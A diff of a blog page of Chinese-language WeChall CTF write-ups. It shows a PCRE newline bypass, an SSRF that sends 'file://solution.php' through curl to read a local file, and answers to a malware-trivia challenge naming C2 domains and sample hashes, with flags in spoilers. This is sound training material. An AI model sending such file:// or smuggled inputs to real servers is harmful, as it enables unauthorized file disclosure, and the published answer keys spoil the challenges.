class="string">&#x27;[A-Za-z0-9+/=\r\n]+&#x27;</span>, data).group(0)</span><br><span class="line"><span class="built_in">print</span>(base64.b64decode(b64).decode())</span><br><span class="line">PY</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;pre style=<span class="string">&quot;color:#000;&quot;</span>&gt;teh falg si naer!&lt;/pre&gt;</span><br><span class="line">&lt;pre style=<span class="string">&quot;color:#fff;&quot;</span>&gt;the flag is near!&lt;/pre&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;?php                  <span class="comment">#   YOUR_TROPHY</span></span><br><span class="line"><span class="built_in">return</span> <span class="string">&#x27;******************&#x27;</span>; <span class="comment"># &lt;-´ ?&gt;</span></span><br></pre></td></tr></table></figure>
-<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">SteppinStones42Pie</span></span>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-training-regexmini/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="vkkkv">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hello Navi">
-      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Hello Navi">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/WeChall/wechall-training-regexmini/" class="post-title-link" itemprop="url">WeChall - Training - RegexMini</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2026-06-09 17:08:51" itemprop="dateCreated datePublished" datetime="2026-06-09T17:08:51+08:00">2026-06-09</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2026-09-08 22:40:47" itemprop="dateModified" datetime="2026-09-08T22:40:47+08:00">2026-09-08</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
-        </span>
-    </span>
-
-  
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus: </span>
-    
-    <a title="disqus" href="/wp/WeChall/wechall-training-regexmini/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-training-regexmini/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h3 id="challenge">Challenge</h3>
-<p>一个很短的 PHP/PCRE 正则训练。页面要求提交一个
-username：它必须通过正则检查，但长度又要超过正则允许的范围。</p>
-<p>核心逻辑可以简化成：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-zA-Z]&#123;1,16&#125;$/&#x27;</span>, <span class="variable">$username</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;invalid&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$username</span>) &gt; <span class="number">16</span>) &#123;</span><br><span class="line">    <span class="comment">// solved</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>看起来是矛盾的：正则只允许 1 到 16 个英文字母，后面却要求
-<code>strlen($username) &gt; 16</code>。</p>
-<h3 id="solution">Solution</h3>
-<p>关键在 PCRE 里 <code>$</code> 的语义。</p>
-<p>在默认模式下，<code>$</code>
-不只匹配字符串真正结尾，也可以匹配「字符串末尾换行符之前的位置」。也就是说：</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaaaaaaaaaaaaaaa\n</span><br></pre></td></tr></table></figure>
-<p>这串内容有 16 个 <code>a</code>，后面跟一个换行符。</p>
-<p>正则 <code>/^[a-zA-Z]{1,16}$/</code> 匹配时：</p>
-<ul>
-<li><code>^[a-zA-Z]{1,16}</code> 吃掉 16 个 <code>a</code>。</li>
-<li><code>$</code> 可以停在最后的 <code>\n</code> 前面。</li>
-<li>因此 <code>preg_match()</code> 判定通过。</li>
-</ul>
-<p>但 PHP 的 <code>strlen()</code> 会真实计算字节数，换行也算 1
-字节：</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">16 个 a + 1 个 \n = 17</span><br></pre></td></tr></table></figure>
-<p>于是同一个输入同时满足：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-zA-Z]&#123;1,16&#125;$/&#x27;</span>, <span class="variable">$username</span>) === <span class="number">1</span></span><br><span class="line"><span class="title function_ invoke__">strlen</span>(<span class="variable">$username</span>) &gt; <span class="number">16</span></span><br></pre></td></tr></table></figure>
-<p>用 curl 提交时要保留末尾的 literal newline，推荐交给
-<code>--data-urlencode</code>：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ curl -sL \</span><br><span class="line">  -b <span class="string">&#x27;WC=...&#x27;</span> \</span><br><span class="line">  -H <span class="string">&#x27;User-Agent: Mozilla/5.0&#x27;</span> \</span><br><span class="line">  --data-urlencode $<span class="string">&#x27;username=aaaaaaaaaaaaaaaa\n&#x27;</span> \</span><br><span class="line">  <span class="string">&#x27;https://www.wechall.net/challenge/training/regexmini/index.php&#x27;</span></span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-crappyshare/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="vkkkv">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hello Navi">
-      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Hello Navi">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/WeChall/wechall-crappyshare/" class="post-title-link" itemprop="url">WeChall - Crappyshare</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2026-06-09 17:03:22" itemprop="dateCreated datePublished" datetime="2026-06-09T17:03:22+08:00">2026-06-09</time>
+      <time title="Created: 2026-07-12 10:06:48" itemprop="dateCreated datePublished" datetime="2026-07-12T10:06:48+08:00">2026-07-12</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -1187,8 +1658,8 @@ username：它必须通过正则检查，但长度又要超过正则允许的范
       </span>
       <span class="post-meta-item-text">Disqus: </span>
     
-    <a title="disqus" href="/wp/WeChall/wechall-crappyshare/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-crappyshare/" itemprop="commentCount"></span>
+    <a title="disqus" href="/wp/WeChall/wechall-malware/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-malware/" itemprop="commentCount"></span>
     </a>
   </span>
   
@@ -1203,36 +1674,63 @@ username：它必须通过正则检查，但长度又要超过正则允许的范
     
     <div class="post-body" itemprop="articleBody">
           <h3 id="challenge">Challenge</h3>
-<blockquote>
-<p>Z and Gizmore were thinking of a file-sharing company, Crappyshare,
-to collect the latest warez and earn money in one go. While gizmore was
-working with the designer on the xhtml/css stuff, Z implemented the
-upload script, and we got first results...but it seems to contain a
-vulnerability somewhere. Some crackers already managed to gather
-sensitive local files (solution.php) and broke into the server.</p>
-</blockquote>
-<p>Crappyshare 是一个文件共享站，支持两种上传方式：直接上传文件，或通过
-URL 远程拉取文件。目标是通过漏洞读取服务器本地的
-<code>solution.php</code>。</p>
+<p>This challenge consists of 6 different parts.</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">1. Hi, This is an **\*\*\*\*\*\*\*\*** virus. As you know we are not so technical advanced as in the West. We therefore ask you to delete all your files on your harddisk manually and send this email to all your friends.</span><br><span class="line"></span><br><span class="line">2. When you see &quot;Dis is one half&quot; on your screen, half of your hard drive has been encrypted with **\*\*\*** encryption.</span><br><span class="line"></span><br><span class="line">3. **\*\*\*\* \*\*\*\*** is a great DNS technique for botherders to avoid shutting down of their malware or phishing site and to hide these sites with an ever-changing network of compromised hosts acting as proxies.</span><br><span class="line"></span><br><span class="line">4. Download the source code for netsky.ae (variant name by Kaspersky), in the main.cpp (sha-256sum=e80d5db98e3e661bee9e57e0e524de2b97db2f48c63f2e73c562719501aeddc1) the first host name in the 90. row is www.**\*\*\*\*\***.com</span><br><span class="line"></span><br><span class="line">5. After downloading and installing Trojan-PSW.Win32.Sinowal.w (variant name by Kaspersky) (sha-256sum=c21ae31e700930b02ad8c286c098770a1baad33abae6436733bb024998bdd19e), first the malware queries the DNS for r**\*\*\*\*\***.com (include r in the final answer).</span><br><span class="line"></span><br><span class="line">6. Download Trojan-GameThief.Win32.Nilage.mc (variant name by Kaspersky) (sha-256sum=d2243520460811f14c7f77dce093b807e546298b6eb3e8d8a8f4581f28057284), unpack and analyze. The executable contains the string: c:\\**\*\*\*\*\***.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Your task is to fill in the \* parts, concatenate the answers with \_ (underscore) and remove any spaces (if any). To be more precise, the solution string will contain 5 \_ and altogether 43 characters. You only have to answer 5 out of the 6 questions correctly to be succesfull, but please include every answer (even if one is known wrong).</span><br></pre></td></tr></table></figure>
 <h3 id="solution">Solution</h3>
-<p>查看源码（<code>index.php?show=code</code>）发现
-<code>upload_please_by_url()</code> 函数：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_please_by_url</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">1</span> === <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;#^[a-z]&#123;3,5&#125;://#&#x27;</span>, <span class="variable">$url</span>)) <span class="comment">// 验证有 URL scheme</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="literal">true</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="literal">true</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_FAILONERROR, <span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">false</span> === (<span class="variable">$file_data</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>)))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="title function_ invoke__">htmlDisplayError</span>(<span class="string">&#x27;cURL failed.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="title function_ invoke__">upload_please_thx</span>(<span class="variable">$file_data</span>);  <span class="comment">// 显示文件内容</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>关键漏洞：URL scheme 检查为 <code>[a-z]&#123;3,5&#125;://</code>，这意味着
-<code>file://</code> 协议没有被阻止。cURL 的 <code>file://</code>
-协议可以读取本地文件系统。直接用 <code>file://solution.php</code> 作为
-URL 上传源：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ curl -s -b <span class="string">&#x27;WC=...&#x27;</span> --data-urlencode <span class="string">&#x27;url=file://solution.php&#x27;</span> \</span><br><span class="line">  <span class="string">&#x27;https://www.wechall.net/challenge/crappyshare/crappyshare.php&#x27;</span></span><br></pre></td></tr></table></figure>
-<p>响应中包含 <code>solution.php</code> 的内容：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#########################</span></span><br><span class="line"><span class="comment">### ***************** ###</span></span><br><span class="line"><span class="comment">#########################</span></span><br></pre></td></tr></table></figure>
-<h3 id="summary">Summary</h3>
-<p>这个漏洞是典型的 SSRF（Server-Side Request
-Forgery）：服务端本应只允许 HTTP/HTTPS URL，但 Scheme 验证太宽松，允许了
-<code>file://</code> 协议。cURL 的 <code>file://</code>
-直接读取本地文件，绕过了所有访问控制。修复方案是只允许
-<code>https?://</code> 的 URL，并过滤掉
-<code>file://</code>、<code>ftp://</code> 等内部协议。</p>
-<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">ICaNSeEcLeArLyNoW</span></span>
+<h4 id="part-1-albanian">Part 1: <code>ALBANIAN</code></h4>
+<p>题面描述的是 ILOVEYOU 蠕虫（LoveLetter，2000年）："Hi"
+开头、要求删除文件、转发给所有好友的邮件蠕虫。但填空的 8 个星号对应的是
+<strong>ALBANIAN</strong>（Albanian 病毒），不是
+ILOVEYOU。答案全大写。</p>
+<h4 id="part-2-xor">Part 2: <code>XOR</code></h4>
+<p>"Dis is one half" 是 OneHalf DOS 病毒（1994年）的显示信息，硬盘被 XOR
+encryption 部分加密。3 个星号对应 <strong>XOR</strong>，全大写。</p>
+<h4 id="part-3-fastflux">Part 3: <code>fastflux</code></h4>
+<p>题面完整定义了 fast-flux DNS：botnet 通过快速变更 DNS A
+记录，在不断变化的代理主机网络中隐藏恶意/钓鱼站点。<code>**** ****</code>
+= "fast flux"，去空格后 8 字符
+<code>fastflux</code>，全小写。注意首轮测试中混合大小写变体（FastFlux/FASTFLUX/fast-flux）被拒，唯
+<code>fastflux</code> 正确。</p>
+<h4 id="part-4-norton">Part 4: <code>norton</code></h4>
+<p>通过 Wayback Machine 获取 VX Heaven 的 netsky_ae.zip
+在线浏览，<code>main.cpp</code> 第 90 行：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">char</span>* buffer = <span class="string">&quot;127.0.0.1 www.norton.com 127.0.0.1 norton.com 127.0.0.1 yahoo.com...&quot;</span>;</span><br></pre></td></tr></table></figure>
+<p>第一个 <code>www.******.com</code> = <strong>norton</strong>（6
+字符）。</p>
+<p>Web Archive
+来源：<code>https://web.archive.org/web/20150418161252id_/http://vxheaven.org/src_view.php?file=netsky_ae.zip&amp;view=main.cpp</code></p>
+<h4 id="part-5-rikora-未解占位">Part 5: <code>rikora</code>
+（未解占位）</h4>
+<p>Sinowal.w（SHA256:
+<code>c21ae31e700930b02ad8c286c098770a1baad33abae6436733bb024998bdd19e</code>）首次
+DNS 查询。Torpig/Sinowal 论文（UCSB 2009）列出硬编码 C2 域名为
+<code>rikora.com</code>、<code>pinakola.com</code>、<code>flippibi.com</code>。提交
+<code>rikora</code> 未增加正确数。</p>
+<p>注意题面 <code>r******</code> 表明答案应为 r + 6 字 = 7 字符，而
+<code>rikora</code> 仅 6
+字符。可能该特定变种使用不同域名，或题面星号数不精确。</p>
+<h4 id="part-6-t1game">Part 6: <code>t1game</code></h4>
+<p>Trojan-GameThief.Win32.Nilage.mc（SHA256:
+<code>d2243520460811f14c7f77dce093b807e546298b6eb3e8d8a8f4581f28057284</code>），Lineage
+游戏密码窃取木马，UPX 压缩。</p>
+<p>从 Hybrid Analysis 沙箱运行的 Nilage.mc 报告中提取的字符串表确认偏移
+126544 处有 <code>t1game</code> + <code>.txt</code>。Microsoft 的
+PWS:Win32/Lineage 威胁文档也确认该家族常用 <code>t1game.txt</code>
+存储窃取的凭据。</p>
+<p>答案：<strong><code>t1game</code></strong>（6 字符），对应
+<code>c:\t1game.txt</code>。</p>
+<h3 id="验证方法">验证方法</h3>
+<p>通过 WeChall authme 端点 POST 提交，服务器返回逐部分正确数：</p>
+<ol type="1">
+<li><code>ALBANIAN_xxx_aaaaaaaa_bbbbbb_cccccc_dddddd</code> → 1/6（仅
+Part 1 正确）</li>
+<li><code>ALBANIAN_XOR_fastflux_norton_cccccc_dddddd</code> → 4/6（Parts
+1-4 全部正确）</li>
+<li><code>ALBANIAN_XOR_fastflux_norton_rikora_gamect1</code> → 4/6（Part
+5 和 Part 6 均未通过）</li>
+<li><code>ALBANIAN_XOR_fastflux_norton_rikora_t1game</code> →
+<strong>5/6 通过</strong></li>
+</ol>
 
       
     </div>
@@ -1259,7 +1757,7 @@ Forgery）：服务端本应只允许 HTTP/HTTPS URL，但 Scheme 验证太宽�
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-php-my-admin/">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-warchall-training-7-tropical-fruits/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.png">
@@ -1277,7 +1775,7 @@ Forgery）：服务端本应只允许 HTTP/HTTPS URL，但 Scheme 验证太宽�
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/WeChall/wechall-php-my-admin/" class="post-title-link" itemprop="url">WeChall - PHP My Admin</a>
+          <a href="/wp/WeChall/wechall-warchall-training-7-tropical-fruits/" class="post-title-link" itemprop="url">WeChall - Training - Warchall - 7 Tropical Fruits</a>
         </h2>
 
         <div class="post-meta-container">
@@ -1288,127 +1786,7 @@ Forgery）：服务端本应只允许 HTTP/HTTPS URL，但 Scheme 验证太宽�
       </span>
       <span class="post-meta-item-text">Posted on</span>
 
-      <time title="Created: 2026-06-09 16:59:49" itemprop="dateCreated datePublished" datetime="2026-06-09T16:59:49+08:00">2026-06-09</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2026-09-08 22:40:47" itemprop="dateModified" datetime="2026-09-08T22:40:47+08:00">2026-09-08</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
-        </span>
-    </span>
-
-  
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus: </span>
-    
-    <a title="disqus" href="/wp/WeChall/wechall-php-my-admin/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-php-my-admin/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h3 id="challenge">Challenge</h3>
-<p>这是一道 Research 类挑战，目标是找到 WeChall 管理员使用的隐藏
-phpMyAdmin
-页面。题面没有表单，也不需要提交密码；找到正确入口后访问即可判定。</p>
-<p>页面底部藏了一行接近白色的提示文字（<code>color:#fefefe</code>，白底白字，查看
-HTML 源码可见）：</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You don&#x27;t need a hint, do you?</span><br></pre></td></tr></table></figure>
-<h3 id="solution">Solution</h3>
-<p>题名 <code>PHP My Admin</code> 本身就是提示。<code>pma</code> 是
-phpMyAdmin 的常见缩写，所以直接尝试对应子域名：</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://pma.wechall.net/</span><br></pre></td></tr></table></figure>
-<p>访问该子域名会触发挑战检查。公开未登录访问也能看到命中提示，但不会记录账号进度：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ curl -skL \</span><br><span class="line">  -H <span class="string">&#x27;User-Agent: Mozilla/5.0&#x27;</span> \</span><br><span class="line">  <span class="string">&#x27;https://pma.wechall.net/&#x27;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">1:76:Your answer is correct. To keep track of your progress you need to register.</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-<p>这里需要 <code>-k</code> /
-<code>--insecure</code>，因为站点返回的证书是
-<code>CN=www.wechall.net</code>，SAN 里只有
-<code>wc2.wechall.net</code>、<code>wechall.net</code>、<code>www.wechall.net</code>，不包含
-<code>pma.wechall.net</code>。浏览器访问时也会看到证书警告，继续访问即可。</p>
-<p>带登录态复现时把 <code>WC=...</code> 换成自己的 cookie：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ curl -skL \</span><br><span class="line">  -b <span class="string">&#x27;WC=...&#x27;</span> \</span><br><span class="line">  -H <span class="string">&#x27;User-Agent: Mozilla/5.0&#x27;</span> \</span><br><span class="line">  <span class="string">&#x27;https://pma.wechall.net/&#x27;</span></span><br></pre></td></tr></table></figure>
-<p>如果账号状态更新成功，最终以 <code>/en/challs</code> 里
-<code>PHP My Admin</code> 的 <code>wc_chall_solved_1</code> 为准。</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-repeating-history/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="vkkkv">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hello Navi">
-      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Hello Navi">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/WeChall/wechall-repeating-history/" class="post-title-link" itemprop="url">WeChall - Repeating History</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2026-06-09 16:57:39" itemprop="dateCreated datePublished" datetime="2026-06-09T16:57:39+08:00">2026-06-09</time>
+      <time title="Created: 2026-07-11 20:02:21" itemprop="dateCreated datePublished" datetime="2026-07-11T20:02:21+08:00">2026-07-11</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -1436,8 +1814,8 @@ phpMyAdmin 的常见缩写，所以直接尝试对应子域名：</p>
       </span>
       <span class="post-meta-item-text">Disqus: </span>
     
-    <a title="disqus" href="/wp/WeChall/wechall-repeating-history/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-repeating-history/" itemprop="commentCount"></span>
+    <a title="disqus" href="/wp/WeChall/wechall-warchall-training-7-tropical-fruits/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-warchall-training-7-tropical-fruits/" itemprop="commentCount"></span>
     </a>
   </span>
   
@@ -1451,186 +1829,36 @@ phpMyAdmin 的常见缩写，所以直接尝试对应子域名：</p>
     
     
     <div class="post-body" itemprop="articleBody">
-          <h3 id="challenge">Challenge</h3>
-<blockquote>
-<p>This challenge is about researching the GWF3 codebase. I have put 2
-passwords somewhere, but .... The first password is obvious and the
-second is very subversive. Both are near. Combine them without any
-separator.</p>
-</blockquote>
-<p>需要研究 WeChall 的 GWF3 框架源码，找到两个隐藏的密码。</p>
-<h3 id="solution">Solution</h3>
-<p>GWF3 源码在 GitHub：<code>gizmore/gwf3</code></p>
-<p><strong>第一个密码</strong>（"obvious"）：</p>
-<p>在
-<code>www/challenge/subversive/repeating/what_do_you_want_here.php</code>
-中，PHP 注释里藏着密码：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="comment">/*InDaxIn*/</span> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>页面源码显示空引号，但查看原始 HTML 可以看到注释中的
-<code>InDaxIn</code>。</p>
-<p><strong>第二个密码</strong>（"very subversive"）：</p>
-<p>在 <code>www/challenge/subversive/history/install.php</code> 的 git
-历史中。当前版本：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$solution</span> = <span class="string">&#x27;2bda2998d9b0ee197da142a0447f6725&#x27;</span>;  <span class="comment">// MD5(&quot;wrong&quot;) — 红鲱鱼！</span></span><br></pre></td></tr></table></figure>
-<p>通过 <code>git log</code> 查看历史提交，原始密码是
-<code>NothingHereMoveAlong</code>，后来被替换成了 MD5("wrong")
-的哈希。</p>
-<p>这就是为什么挑战叫 "Repeating History"：需要重复/回溯 git
-历史才能找到原始密码。</p>
-<p><strong>组合答案</strong>：<code>InDaxIn</code> +
-<code>NothingHereMoveAlong</code>（无分隔符）</p>
-<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">InDaxInNothingHereMoveAlong</span></span>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
